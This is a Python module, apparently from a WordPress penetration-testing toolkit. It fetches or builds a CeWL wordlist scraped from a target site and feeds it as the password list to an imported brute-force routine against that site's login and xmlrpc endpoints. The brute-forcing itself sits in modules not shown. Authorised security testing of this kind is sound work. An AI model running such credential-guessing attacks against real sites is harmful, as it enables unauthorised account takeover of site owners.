from input_parser import InputParser
from sqlalchemy import select

from scan_scripts.brutal import brutal
from scan_scripts.cewl import cewl_site
from wp_config import CONFIG
from wp_db import valid_wp_link, get_session, CewlList
from wp_log import print_e

__description__ = """ Bruteforce WordPress site with cewl list"""

def get_args(raw_args):
    parser = InputParser(description="Brutal script with cewl link")
    parser.add_argument('--wp_link', type=str, required=True, help='WordPress link for the enum script')

    parser.add_argument("--user_list", type=str, help="User list - default is from wpscan")
    parser.add_argument("--skip_no_xmlrcp", action="store_false")
    parser.add_argument('--overwrite', action="store_true")

    parser.add_argument('--cewl_scan', action="store_true")
    #TODO  option to set modification before running the script

    return parser.parse_args(raw_args.split())

#get cewl list from database
async def get_cewl_list_by_web_link(web_link):
    async with get_session() as session:
        cewl_list = (await session.execute(
            select(CewlList).filter(CewlList.web_link == web_link)
        )).scalars().first()
        return cewl_list

# bruteforce with cewl list
async def run(raw_args):

    args = get_args(raw_args)

    if not await valid_wp_link(args.wp_link):
        print_e(f"Brutal script requires a valid WordPress link (no {args.wp_link})")
        return

    #get cewl list from database
    cewl = await get_cewl_list_by_web_link(args.wp_link)
    if not cewl or cewl is None:
        if not args.cewl_scan:
            print_e("No CeWL list found for the given wp_link")
            return
        await cewl_site(args.wp_link, overwrite=args.overwrite)
        cewl = await get_cewl_list_by_web_link(args.wp_link)
        print(f"CeWL list created {cewl}")

    cewl_path = f"{CONFIG['wp_hub']['folder_path']}/{cewl.file_list}"
    print(f"CeWL list: {cewl_path}")
    await brutal(args.wp_link, user_list=args.user_list,
                     pass_list=cewl_path, skip_no_xmlrcp=args.skip_no_xmlrcp,
                     overwrite=args.overwrite)



